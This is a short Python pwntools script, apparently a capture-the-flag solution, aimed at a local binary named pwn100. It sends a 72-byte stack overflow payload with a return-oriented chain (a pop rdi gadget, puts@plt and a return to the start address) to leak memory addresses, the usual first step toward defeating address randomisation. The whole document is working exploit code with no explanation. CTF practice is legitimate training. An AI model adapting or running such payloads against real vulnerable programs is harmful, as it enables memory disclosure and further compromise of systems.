from pwn import *
 
io = process("./pwn100")
elf = ELF("./pwn100")
 
 
 
start_addr = 0x400550
pop_rdi = 0x400763
puts_addr = elf.plt['puts']
 
def leak(addr):
       payload = "A" *72
       payload += p64(pop_rdi)
       payload += p64(addr)
       payload += p64(puts_addr)
       payload += p64(start_addr)
       payload = payload.ljust(200, "B")
       io.send(payload)
       content = io.recv()[5:]
       log.info("%#x => %s" % (addr, (content or '').encode('hex')))
       return content
	   
leak(puts_addr)